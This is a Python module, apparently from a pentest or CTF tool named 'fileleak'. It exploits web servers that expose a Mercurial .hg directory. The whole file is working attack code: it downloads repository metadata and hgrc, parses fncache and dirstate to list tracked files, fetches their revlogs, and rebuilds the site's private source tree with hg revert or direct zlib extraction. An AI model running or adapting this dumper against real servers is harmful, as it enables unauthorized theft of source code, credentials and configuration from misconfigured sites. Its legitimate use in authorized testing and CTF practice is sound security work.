"""Mercurial (.hg) repository leak exploiter."""

import asyncio
import logging
import os
import struct
import subprocess
import zlib
from pathlib import Path

from rich.console import Console

from fileleak.core.base import BaseDumper
from fileleak.core.utils import ensure_dir, sanitize_path, save_file

logger = logging.getLogger(__name__)
console = Console()


class HgDumper(BaseDumper):
    """Mercurial (.hg) repository leak exploiter.

    Downloads the exposed .hg directory, parses metadata files (fncache,
    dirstate) to discover tracked source files, downloads their revlog
    data from store/data/, and attempts to restore the working tree via
    ``hg revert`` or direct inline revlog extraction.

    Strategy mirrors dvcs-ripper (rip-hg.pl):
      1. Download known .hg metadata files
      2. Parse fncache/dirstate/hg-status for tracked file list
      3. Download store/data/{filepath}.i and .d for each file
      4. hg revert --all (or per-file fallback)
      5. If hg unavailable, extract directly from inline revlog
    """

    HG_FILES = [
        # Basic metadata
        "requires",
        "branch",
        "dirstate",
        "bookmarks",
        # Root-level revlog (revlogv0 / some repo formats)
        "00changelog.i",
        "00changelog.d",
        "00manifest.i",
        "00manifest.d",
        # Cache and backup files (valuable for CTF/pentest)
        "last-message.txt",
        "tags.cache",
        "branchheads.cache",
        "undo.branch",
        "undo.desc",
        ".hgignore",
        "hgrc",
        # Undo metadata
        "undo.dirstate",
        # Store metadata
        "store/00changelog.i",
        "store/00changelog.d",
        "store/00manifest.i",
        "store/00manifest.d",
        "store/fncache",
        "store/undo",
        "store/undo.backupfiles",
        "store/phaseroots",
    ]

    def __init__(self, url: str, **kwargs):
        super().__init__(url, **kwargs)
        self.base_url = self._normalize_url(url)

    async def start(self):
        """Download .hg metadata and recover source files."""
        console.print("[bold cyan][HgDumper][/bold cyan] Starting Mercurial dump...")

        # 1. Download all known .hg metadata files
        await self._download_metadata()

        # 2. Get file list from fncache
        files = await self._parse_fncache()

        # 3. Fallback: dirstate
        if not files:
            files = await self._parse_dirstate()

        # 4. Download store/data revlog files
        if files:
            console.print(f"[green]Found {len(files)} tracked file(s)[/green]")
            await self._download_store_files(files)

        # 5. Try hg revert to recover working directory
        reverted = await self._try_revert(files)

        # 6. If revert failed, try direct revlog extraction
        if not reverted and files:
            console.print(
                "[bold cyan][HgDumper][/bold cyan] hg not available, extracting from revlog..."
            )
            await self._extract_from_revlog(files)

        # 7. Fallback: hg status (if hg worked but we had no file list initially)
        if not files:
            extra_files = await self._try_hg_status()
            if extra_files:
                console.print(f"[green]Found {len(extra_files)} file(s) via hg status[/green]")
                await self._download_store_files(extra_files)
                if not reverted:
                    await self._extract_from_revlog(extra_files)

        stats = self.get_stats()
        console.print(
            f"[bold cyan][HgDumper][/bold cyan] Done. "
            f"Downloaded: {stats['downloaded']}, "
            f"Failed: {stats['failed']}, "
            f"Skipped: {stats['skipped']}"
        )

    # ------------------------------------------------------------------
    # Internal helpers
    # ------------------------------------------------------------------

    async def _download_metadata(self):
        """Download all known .hg metadata files sequentially.

        Many CTF/challenge servers rate-limit or drop connections when
        hit with too many concurrent requests.  Download one at a time
        to maximise reliability (metadata files are small and few).
        """
        console.print("[bold cyan][HgDumper][/bold cyan] Downloading metadata files...")
        for f in self.HG_FILES:
            await self.download(f"{self.base_url}/{f}", f".hg/{f}")

    async def _parse_fncache(self) -> list[str]:
        """Parse .hg/store/fncache to get list of tracked files.

        fncache has one path per line, prefixed with ``data/`` and
        suffixed with ``.i`` or ``.d``.  We strip the prefix and suffix
        to recover the original file path.
        """
        fncache_path = os.path.join(self.output_dir, ".hg", "store", "fncache")
        if not os.path.isfile(fncache_path):
            return []

        try:
            with open(fncache_path, "rb") as f:
                raw = f.read()
        except OSError as exc:
            logger.warning(f"Failed to read fncache: {exc}")
            return []

        files: list[str] = []
        seen: set[str] = set()
        for line in raw.splitlines():
            entry = line.decode("utf-8", errors="replace").strip()
            if not entry:
                continue
            # fncache entries look like: data/dir/subdir/filename.i
            # or: data/dir/subdir/filename.d
            if entry.startswith("data/"):
                path = entry[len("data/"):]
                # Remove the trailing .i or .d suffix
                if path.endswith(".i") or path.endswith(".d"):
                    path = path[:-2]
                # Only keep each source file once (skip duplicates
                # where both .i and .d are listed)
                if path not in seen:
                    seen.add(path)
                    files.append(path)

        logger.debug(f"fncache parsed: {len(files)} unique file(s)")
        return files

    async def _parse_dirstate(self) -> list[str]:
        """Parse .hg/dirstate binary format to get filenames.

        Mercurial dirstate binary format::

            Header: 40 bytes (two 20-byte parent changeset hashes)
            Each entry:
                1 byte  : state ('n'=normal, 'a'=added, 'r'=removed, 'm'=merged)
                4 bytes : mode   (big-endian int32)
                4 bytes : size   (big-endian int32)
                4 bytes : mtime  (big-endian int32)
                4 bytes : filename length (big-endian int32)
                N bytes : filename (UTF-8)
        """
        dirstate_path = os.path.join(self.output_dir, ".hg", "dirstate")
        if not os.path.isfile(dirstate_path):
            return []

        try:
            with open(dirstate_path, "rb") as f:
                raw = f.read()
        except OSError as exc:
            logger.warning(f"Failed to read dirstate: {exc}")
            return []

        if len(raw) < 40:
            logger.warning("dirstate file too small, cannot parse")
            return []

        files: list[str] = []
        offset = 40  # skip the two parent hashes
        while offset + 17 <= len(raw):
            state = chr(raw[offset])
            mode, size, mtime, name_len = struct.unpack_from(">4i", raw, offset + 1)
            offset += 17
            if offset + name_len > len(raw):
                break
            try:
                filename = raw[offset : offset + name_len].decode("utf-8", errors="replace")
            except Exception:
                filename = ""
            offset += name_len

            if filename and state in ("n", "a", "m"):
                files.append(filename)

        logger.debug(f"dirstate parsed: {len(files)} file(s)")
        return files

    async def _download_store_files(self, files: list[str]):
        """Download revlog files (``.i`` and ``.d``) from ``store/data/``.

        Downloads sequentially to avoid server rate-limiting.
        Only .i (index+data) is required; .d (separate data) may not exist
        for inline revlogs, so .d failures are treated as normal.
        """
        console.print(
            f"[bold cyan][HgDumper][/bold cyan] "
            f"Downloading revlog data for {len(files)} file(s)..."
        )
        # Download .i files one by one (required)
        for filepath in files:
            store_path = f"store/data/{filepath}"
            url = f"{self.base_url}/{store_path}.i"
            local = f".hg/{store_path}.i"
            await self.download(url, local)

        # Try .d files (optional - inline revlogs don't have separate .d)
        saved_failed = self.failed_count
        for filepath in files:
            store_path = f"store/data/{filepath}"
            url = f"{self.base_url}/{store_path}.d"
            local = f".hg/{store_path}.d"
            await self.download(url, local)

        # .d failures are expected for inline revlogs, don't count them
        d_failures = self.failed_count - saved_failed
        if d_failures > 0:
            self.failed_count -= d_failures
            logger.debug(f"Ignored {d_failures} .d file 404s (expected for inline revlog)")

    async def _try_hg_status(self) -> list[str]:
        """Fallback: use 'hg status -A' to get tracked file list."""
        try:
            result = await asyncio.to_thread(
                subprocess.run,
                ["hg", "status", "-A"],
                cwd=self.output_dir,
                capture_output=True,
                timeout=30,
            )
            files = []
            for line in result.stdout.decode("utf-8", errors="replace").splitlines():
                parts = line.split(None, 1)
                if len(parts) == 2:
                    files.append(parts[1])
            return files
        except Exception:
            return []

    async def _try_rebuild_metadata(self):
        """Run hg commands to rebuild missing metadata files.

        After downloading raw .hg data, Mercurial commands can regenerate
        files like fncache, 00changelog.i, etc. that may not be directly
        downloadable from the server. This mirrors dvcs-ripper's approach
        where running hg status/revert causes Mercurial to auto-repair.
        """
        hg_dir = os.path.join(self.output_dir, ".hg")
        if not os.path.isdir(hg_dir):
            return

        # Try hg recover (repairs incomplete transactions)
        try:
            result = await asyncio.to_thread(
                subprocess.run,
                ["hg", "recover"],
                cwd=self.output_dir,
                capture_output=True,
                timeout=15,
            )
            if result.returncode == 0:
                console.print("[green][+][/green] hg recover succeeded")
        except Exception:
            pass

        # Try hg debugrebuildfncache (regenerates fncache)
        try:
            result = await asyncio.to_thread(
                subprocess.run,
                ["hg", "debugrebuildfncache"],
                cwd=self.output_dir,
                capture_output=True,
                timeout=15,
            )
            if result.returncode == 0:
                console.print("[green][+][/green] hg debugrebuildfncache succeeded")
        except Exception:
            pass

    async def _try_revert(self, files: list[str] | None = None) -> bool:
        """Try to restore working directory using hg revert.

        Strategy (mirrors dvcs-ripper):
          0. Rebuild metadata (fncache, changelog) via hg commands
          1. Try ``hg revert --all --no-backup``
          2. If that fails, try per-file ``hg revert {filename}``

        Returns True if revert succeeded (at least partially), False otherwise.
        """
        hg_dir = os.path.join(self.output_dir, ".hg")
        if not os.path.isdir(hg_dir):
            return False

        # Step 0: Rebuild missing metadata before revert
        await self._try_rebuild_metadata()

        # Attempt 1: hg revert --all
        try:
            result = await asyncio.to_thread(
                subprocess.run,
                ["hg", "revert", "--all", "--no-backup"],
                cwd=self.output_dir,
                capture_output=True,
                timeout=30,
            )
            if result.returncode == 0:
                console.print("[green][+][/green] hg revert --all succeeded")
                return True
            else:
                console.print(
                    f"[yellow][-][/yellow] hg revert --all failed: "
                    f"{result.stderr.decode(errors='replace').strip()}"
                )
        except FileNotFoundError:
            console.print("[yellow][-][/yellow] hg command not found, will try manual extraction")
            return False
        except Exception as exc:
            logger.debug(f"hg revert --all error: {exc}")

        # Attempt 2: per-file revert (dvcs-ripper fallback strategy)
        if not files:
            return False

        reverted_any = False
        for filepath in files:
            try:
                result = await asyncio.to_thread(
                    subprocess.run,
                    ["hg", "revert", "--no-backup", filepath],
                    cwd=self.output_dir,
                    capture_output=True,
                    timeout=10,
                )
                if result.returncode == 0:
                    reverted_any = True
                    console.print(f"[green][+][/green] Reverted: {filepath}")
            except Exception:
                break

        if reverted_any:
            console.print("[green][+][/green] Per-file revert partially succeeded")
        return reverted_any

    async def _extract_from_revlog(self, files: list[str]):
        """Extract file content directly from inline revlog when hg is unavailable.

        Inline revlog format:
          Each record = 64-byte header + comp_len bytes of data
          Header layout:
            offset_flags (6B) + comp_len (4B) + uncomp_len (4B) + base_rev (4B) +
            link_rev (4B) + p1 (4B) + p2 (4B) + nodeid (32B) = 64 bytes
          Data compression:
            - First byte 0x78 ('x') -> zlib compressed
            - First byte 'u' -> uncompressed (strip 'u' prefix)
            - Otherwise -> raw data
        """
        extracted = 0
        for filepath in files:
            store_path = os.path.join(
                self.output_dir, ".hg", "store", "data", f"{filepath}.i"
            )
            if not os.path.exists(store_path):
                continue

            try:
                with open(store_path, "rb") as f:
                    data = f.read()

                if len(data) < 64:
                    continue

                # Parse inline revlog: iterate through all revisions,
                # keep the last one (most recent)
                offset = 0
                last_content = None

                while offset < len(data):
                    if offset + 64 > len(data):
                        break

                    # Parse 64-byte header
                    header = data[offset:offset + 64]

                    # Bytes 8-12: compressed length (big-endian uint32)
                    comp_len = struct.unpack(">I", header[8:12])[0]

                    if comp_len == 0:
                        offset += 64
                        continue

                    # For inline revlog, data follows immediately after header
                    chunk_start = offset + 64
                    chunk_end = chunk_start + comp_len

                    if chunk_end > len(data):
                        break

                    chunk = data[chunk_start:chunk_end]

                    # Decompress
                    try:
                        if chunk and chunk[0:1] == b'x':
                            content = zlib.decompress(chunk)
                        elif chunk and chunk[0:1] == b'u':
                            content = chunk[1:]
                        else:
                            content = chunk
                        last_content = content
                    except Exception:
                        # If decompression fails, use raw data
                        last_content = chunk

                    offset = chunk_end

                # Save the last revision content (most recent version)
                if last_content:
                    safe = self.validate_path(filepath)
                    if safe:
                        ensure_dir(safe)
                        await save_file(safe, last_content)
                        self.downloaded_count += 1
                        extracted += 1
                        console.print(f"[green][+][/green] Extracted: {filepath}")

            except Exception as e:
                console.print(f"[yellow][-][/yellow] Failed to extract {filepath}: {e}")

        if extracted:
            console.print(
                f"[bold cyan][HgDumper][/bold cyan] "
                f"Extracted {extracted} file(s) from revlog"
            )

    # ------------------------------------------------------------------
    # URL normalization
    # ------------------------------------------------------------------

    @staticmethod
    def _normalize_url(url: str) -> str:
        """Ensure the URL points to the ``.hg`` directory."""
        url = url.rstrip("/")
        if url.endswith(".hg"):
            return url
        if "/.hg" not in url:
            url = url + "/.hg"
        return url
